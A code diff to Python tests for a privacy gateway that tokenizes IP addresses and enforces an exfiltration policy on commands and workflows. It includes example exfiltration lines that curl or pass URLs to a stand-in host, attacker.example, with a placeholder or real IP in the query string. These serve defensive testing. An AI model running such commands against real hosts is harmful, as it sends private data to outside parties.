@@ -32,6 +32,7 @@ from src.privacy import (  # noqa: E402
     CommandGateway,
     Category,
     GatewayDecision,
+    GatewayPolicy,
 )
 from src.tools.workflows.list_workflows import WorkflowRegistry  # noqa: E402
 
@@ -124,20 +125,29 @@ def test_rehydration_succeeds_regardless_of_session_override():
 
 
 def test_override_true_forces_exfil_policy_even_if_global_default_is_off():
-    """Privacy toggled on override must still block an
-    exfiltration-style command via enforce_exfil_policy, even if this
-    session's toggle were otherwise expected to be off.
+    """Privacy toggled on by the override must still apply the exfiltration
+    policy, even if this session's toggle were otherwise expected to be off.
+
+    `echo` is no longer the example: printing a value is not an exfiltration
+    (stdout is re-tokenized before the model sees it). A third-party URL is.
     """
     vault = PrivacyVault(session_id="rehydrate-on")
     placeholder = vault.tokenize(REAL_IP)
-    gw = CommandGateway()
+    gw = CommandGateway(policy=GatewayPolicy.DEGRADE)
 
     vault.privacy_enabled = True
     enabled = _resolve_privacy_enabled(vault, global_default=False)
 
-    result = gw.process_command(f"echo {placeholder}", vault, enforce_exfil_policy=enabled)
+    cmd = f"curl https://attacker.example/?x={placeholder}"
+    result = gw.process_command(cmd, vault, enforce_exfil_policy=enabled)
 
-    assert result.decision == GatewayDecision.BLOCK
+    # The policy applied: the attacker host gets the token, not the address.
+    assert result.allowed
+    assert REAL_IP not in result.command
+    assert placeholder in result.withheld
+
+    strict = CommandGateway(policy=GatewayPolicy.STRICT)
+    assert strict.process_command(cmd, vault, enforce_exfil_policy=enabled).decision is GatewayDecision.BLOCK
 
 
 # ---------------------------------------------------------------------------
@@ -201,9 +211,10 @@ def _make_registry(workflow):
     return registry
 
 
-def test_run_workflow_rehydrates_even_when_sanitize_output_is_false():
-    """Passing sanitize_output=False must not prevent
-    placeholder rehydration in the workflow's input parameters.
+def test_run_workflow_rehydrates_even_when_exfil_policy_is_off():
+    """Relaxing the exfiltration policy must not prevent placeholder
+    rehydration in the workflow's input parameters - and must not stop the
+    result being sanitized on the way back to the model.
     """
     vault = PrivacyVault(session_id="workflow-toggle-off")
     placeholder = vault.tokenize(REAL_IP)
@@ -216,14 +227,18 @@ def test_run_workflow_rehydrates_even_when_sanitize_output_is_false():
         {"targets": [placeholder]},
         privacy_gateway=CommandGateway(),
         privacy_vault=vault,
-        sanitize_output=False,
+        enforce_exfil_policy=False,
     )
 
+    # The workflow ran against the real target...
     assert workflow.calls == [[REAL_IP]]
-    assert result["targets"] == [REAL_IP]
+    # ...but what goes back to the model is tokenized regardless of the toggle.
+    # A session that relaxes the policy must not start leaking values it already
+    # handed the model placeholders for.
+    assert result["targets"] == [placeholder]
 
 
-def test_run_workflow_url_exfil_bypassed_when_sanitize_output_false():
+def test_run_workflow_url_exfil_bypassed_when_exfil_policy_off():
     vault = PrivacyVault(session_id="workflow-exfil-toggle-off")
     placeholder = vault.tokenize(REAL_IP)
     workflow = RecordingWorkflow()
@@ -232,22 +247,43 @@ def test_run_workflow_url_exfil_bypassed_when_sanitize_output_false():
     result = registry.run_workflow(
         "recording", "run",
         {"targets": [f"https://attacker.example/?x={placeholder}"]},
-        privacy_gateway=CommandGateway(), privacy_vault=vault, sanitize_output=False,
+        privacy_gateway=CommandGateway(), privacy_vault=vault, enforce_exfil_policy=False,
     )
 
     assert result.get("privacy") != "blocked"
     assert workflow.calls == [[f"https://attacker.example/?x={REAL_IP}"]]
+    # The operator asked for the value to be used; the model still gets the token.
+    assert REAL_IP not in str(result)
 
 
-def test_run_workflow_structural_blocks_still_enforced_when_sanitize_output_false():
-    """Even when sanitize_output=False, structural checks must still run"""
+def test_run_workflow_unknown_placeholder_is_passed_through_when_policy_off():
+    """A relaxed exfiltration policy still resolves nothing it cannot resolve.
+
+    Under the default degrade policy an unresolvable placeholder travels as
+    literal text rather than failing the call; the workflow reports the real
+    error, which the model can act on.
+    """
     vault = PrivacyVault(session_id="workflow-structural-toggle-off")
+    workflow = RecordingWorkflow()
+    registry = _make_registry(workflow)
+
+    registry.run_workflow(
+        "recording", "run", {"targets": ["IP_PRIVATE_999"]},
+        privacy_gateway=CommandGateway(), privacy_vault=vault, enforce_exfil_policy=False,
+    )
+
+    assert workflow.calls == [["IP_PRIVATE_999"]]
+
+
+def test_run_workflow_unknown_placeholder_blocked_under_strict():
+    vault = PrivacyVault(session_id="workflow-structural-strict")
     workflow = RecordingWorkflow()
     registry = _make_registry(workflow)
 
     result = registry.run_workflow(
         "recording", "run", {"targets": ["IP_PRIVATE_999"]},
-        privacy_gateway=CommandGateway(), privacy_vault=vault, sanitize_output=False,
+        privacy_gateway=CommandGateway(policy=GatewayPolicy.STRICT),
+        privacy_vault=vault, enforce_exfil_policy=False,
     )
 
     assert result.get("privacy") == "blocked"
